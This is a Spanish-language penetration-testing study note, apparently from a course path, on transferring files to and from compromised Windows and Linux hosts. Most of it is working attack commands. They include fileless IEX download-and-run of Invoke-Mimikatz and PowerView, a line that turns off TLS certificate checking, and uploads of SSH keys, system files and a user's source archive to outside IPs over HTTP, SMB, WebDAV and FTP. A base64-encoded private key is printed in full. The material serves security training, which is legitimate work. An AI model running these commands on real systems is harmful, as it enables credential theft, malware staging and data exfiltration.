# TRANSFERENCIA DE FICHEROS
Tenemos muchos escenarios donde utilizaremos esto y debemos entenderlo.

Entenderemos diferentes formas de transferir archivos y como las redes operar y nos pueden ayudar durante nuestro paso.

Debemos entender que muchos sistemas operativos o adminstradores nos pueden bloquear depende lo que hagamos.

Aprenderemos tecnicas de Windows y linux.

## INTRODUCCION

EL sistema operativo windows tiene muchas versiones y difernetes utilidades para hacer operaciones de transferencia

Normalmente un ataque sigue estos pasos: 
1- Link malicioso
2- Execucion de codigo 
3 - Descargar de codigo malicioso

## POWERSHELL BASE64 ENCODE & DECODE

Dependiendo del tamaño del archivo a transferir, podemos utilizar metodos diferentes que no necesitan una conexion de red.
SI nosotros tenemos acceso a una teminal podremos cifrar un archivo en base64, copiando el contenido y haciendo la operacion reversa y cogiendo el contenido original.

Un uso esencial es utilizar un metodo que sea coorrecto. "md5sum" un programa que verifica hashes  "checksums" y es compacta y ligera

### PWNBOX Check SSH key
```
md5sum id_rsa
4e301756a07ded0a2dd6953abf015278  id_rsa
```
Para cifrar
```
cat id_rsa |base64 -w 0;echo
LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo
```
Copiamos el contenido dentro de la powershell de windows para decodificarlo. 
```
 [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo="))
```
Finalmente ocnfirmamos que todo ha funcionado correctamente porque el hash nos dice que es ese.
```
Get-FileHash C:\Users\Public\id_rsa -Algorithm md5
```
## POWERSHELL DESCARGAS DE WEB
Las compañias utilizan "HTTP" y "HTTPS" para el trafico en red y utilizan un "firewall". Estos son metodos de transferencia muy convenientes. 


Powershell nos da muchas opciones para descargar ficheros desde aqui

![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/06bfaebc-59a9-4066-8e91-2a39fe57df46)

Vamos a ver ejemplos, especificamos una clase "Net.WebClient" y en el metodo "DownloadFile" con los parametros correspondientes de la URL para descargar bien el archivo

```
# Example: (New-Object Net.WebClient).DownloadFile('<Target File URL>','<Output File Name>')
(New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1','C:\Users\Public\Downloads\PowerView.ps1')

# Example: (New-Object Net.WebClient).DownloadFileAsync('<Target File URL>','<Output File Name>')
 (New-Object Net.WebClient).DownloadFileAsync('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1', 'C:\Users\Public\Downloads\PowerViewAsync.ps1')
```

### POWERSHELL METODO FILELESS

Los ataques archivos funciona descargando el payload y ejecutando directamente, nosotros podemos ejecutar en memoria usando la "Invoke-Expression"

```
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1') | IEX
```

### INVOKE-WebREQUEST

```
Invoke-WebRequest https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 -OutFile PowerView.ps1
```
### ERRORES COMUNES CON POWERSHELL

EN muchos caos tendremos problemas con Internet Explorer 

![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/c682319d-b612-4bda-a8a6-262efb442fc2)

Esto se puede bypasear: 
```
Invoke-WebRequest https://<ip>/PowerView.ps1 | IEX
Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing | IEX
```

Otro error son relatar SSL/TLS certificados no confiables
```
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

## DESCARGAR POR SMB

El protocolo de mensajes de servidor o (SMB) funciona en el puerto 445 es comun utilizarla en redes que utilizan Windows. para transferir remotamente ficheros entre servidores.

Nosotros podemos usar SMB para descargar ficheros de nuestra Pwnbox. Nosotros necesitamos crear un servidor SMB en nuestro Pwnbox con [smbserver.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) y entonces copiar y mover las conexiones.

### CREAR UN SERVIDOR SMB

```
sudo impacket-smbserver share -smb2support /tmp/smbshare
````

Para descargar o copiar etc :
```
copy \\192.168.220.133\share\nc.exe
```

### CREAR UN SERVIDOR SMB CON USUARIO Y CONTRASEÑA

```
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

### MONTAR UN SERVIDOR SMB CON USUARIO Y CONTRASEÑA

```
net use n: \\192.168.220.133\share /user:test test
```

## DESCARGAS POR FTP

Otra forma de transferir archivos es usando "FTP" que funciona por el puerto 21 y 20. Podemos usar el cliente FTP o PowerSHell Net.WebCLient para descargar ficheros del servidor FTP.

Podemos configurar el servidor FTP para que use Python3. Puediendo instalarlo con este comando:

```
sudo pip3 install pyftpdlib
```
Nosotros especificamos el puerto 21 porjemeplo, y deberiamos quitar la configuracion de inicio por Anonymous.

### CONFIGURAR UN SEVIDOR FTP POR PYTHON3

```
sudo python3 -m pyftpdlib --port 21
```

Despues de ejecutarlo, nosotros podemos usar cosas predefinidas.

### TRANSFERIR ARCHIVOS DEL SERVIDOR FTP USANDO POWER SHELL
```
(New-Object Net.WebClient).DownloadFile('ftp://192.168.49.128/file.txt', 'C:\Users\Public\ftp-file.txt')
```
Cuando tenemos una shell remota, no podemos interactuar con la shell, Si no es el caso, podemos crear comandos FTP para descargar el ficero, nosotros necesitamos crear un archivo con contenido de los camanos que luego queremos ejecutar.

### CREAR COMANDOS PARA EL CLIENTE FTP

```
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo GET file.txt >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128
Log in with USER and PASS first.
ftp> USER anonymous

ftp> GET file.txt
ftp> bye

C:\htb>more file.txt
This is a test file
```

### SUBIR OPERACIONES

Hay algunas situaciones en las que el crackeo de contraseñas, analisis, filtracion, etc. Deberemos subir archivos a nuestra máquina victima. Podemos usar metodos apra descargar pero ahroa para subir

### POWERSHELL BASE&$ ENCODE Y DECOSE

### CODIFICAR USANDO POWER SHELL
```
[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))
```

### DECODIFICAR USANDO LINUX

```
echo IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQojIHNwYWNlLg0KIw0KIyBBZGRpdGlvbmFsbHksIGNvbW1lbnRzIChzdWNoIGFzIHRoZXNlKSBtYXkgYmUgaW5zZXJ0ZWQgb24gaW5kaXZpZHVhbA0KIyBsaW5lcyBvciBmb2xsb3dpbmcgdGhlIG1hY2hpbmUgbmFtZSBkZW5vdGVkIGJ5IGEgJyMnIHN5bWJvbC4NCiMNCiMgRm9yIGV4YW1wbGU6DQojDQojICAgICAgMTAyLjU0Ljk0Ljk3ICAgICByaGluby5hY21lLmNvbSAgICAgICAgICAjIHNvdXJjZSBzZXJ2ZXINCiMgICAgICAgMzguMjUuNjMuMTAgICAgIHguYWNtZS5jb20gICAgICAgICAgICAgICMgeCBjbGllbnQgaG9zdA0KDQojIGxvY2FsaG9zdCBuYW1lIHJlc29sdXRpb24gaXMgaGFuZGxlZCB3aXRoaW4gRE5TIGl0c2VsZi4NCiMJMTI3LjAuMC4xICAgICAgIGxvY2FsaG9zdA0KIwk6OjEgICAgICAgICAgICAgbG9jYWxob3N0DQo= | base64 -d > hosts
```
```
md5sum hosts
```

### SUBIR WEB POR POWERSHELL

Powershell no tiene una funcion para subir operaciones, pero nosotros podemos invocalor y construirlo. Ncesitamos un servidor que deje subri archivos

Por ejemplo tenemos eso en un hyyp

### INSTALAR Y CONFIGURAR WEBSERVER CON SUBIR ARCHIVOS

```
pip3 install uploadserver
python3 -m uploadserver
```

Ahora podemos usar el script de PowerSHell [PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1) para hacerptar los parametro -File y -Uri para subir archivos

### SCRIPT UPLOAD

```
IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts
```

### POWERSHELL WEB UPLOAD

Otra forma de usar poweshell y base64 es con el post

```
$b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

Podemos hacer un netcat para conectarnos

```
nc -lvnp 8000
```
### SMB UPLOADS

Anteriormente vimos el trafico en el HTTP o HTTPS 80 y 443 comunmente el SMB funciona en el 445 dentro de nuestra red podemos sufrir ataques potenciales.

Otra alternativa en funcionar SMB con la extension HTTP para comunicarse entre ellos

Cuando usamos SMB hay una conexion por dicho protocolo si nos intentacmos conectar po HTTP en wireshark lo podemos ver.

![image](https://github.com/D4l1-web/PenetrationTester-Ruta/assets/79869523/8a6e3cda-f5e6-457d-81b3-cef3c6f47921)

## CONFIGURAR WEBDAV SERVER

NEcesitaremos instalar los modulos de python "wsgidav" y "cheroot" 

### INSTALAR

```
sudo pip3 install wsgidav cheroot
sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous
```

```
dir \\192.168.49.128\DavWWWRoot
```
### SUBIR ARCHIVOS USANDO SMB

```
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```

### FTP UPLOADS

Subir archivos usando FTP es muy simlitar a descargarlos. 
```
sudo python3 -m pyftpdlib --port 21 --write
```
### DESDE POWERSHEll
```
 (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```











